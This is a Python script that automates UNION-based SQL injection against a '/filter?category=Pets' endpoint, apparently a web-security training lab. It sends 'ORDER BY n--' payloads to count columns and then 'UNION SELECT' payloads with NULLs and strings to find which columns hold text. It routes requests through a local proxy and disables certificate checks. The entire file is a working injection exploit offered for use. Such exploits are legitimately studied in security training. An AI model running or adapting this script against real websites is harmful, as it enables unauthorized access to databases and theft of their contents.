import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_col_number(url):
    path = "/filter?category=Pets"

    for i in range(1,50): 
        payload = "'+order+by+%s--" %i
        req = requests.get(url+path+payload,verify=False,proxies=proxies)
        res = req.text
        if "Internal Server Error" in res:
            return i - 1
        i = i+1
    return False


def expoilt_sql_col_data_type(url,numberOfCols):
    sql_payload = ""
    path = "/filter?category=Pets"
    data_type_list = ['1',' \'string\' ']
    col_datatype = {}
    for dataType in data_type_list:
        for colNumber in range(1,numberOfCols+1):
            payload_list = ["NULL"] * numberOfCols 
            payload_list[colNumber-1] = dataType
            sql_payload = "' UNION SELECT " + ','.join(payload_list) + '--'
            req = requests.get(url+path+sql_payload , verify=False , proxies=proxies)
            res = req.text
            if(not('Internal Server Error' in res)):
                print('inside ' + dataType)
                col_datatype[colNumber] = dataType
    return col_datatype


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])


    number_of_col = exploit_sqli_col_number(url)
    if number_of_col:
        print('[+] SQL injection successful! The Number Of Coulum: %s' %number_of_col )
        dic = expoilt_sql_col_data_type(url,number_of_col)
        print(dic)
    else:
        print('[-] SQL injection unsuccessful.')
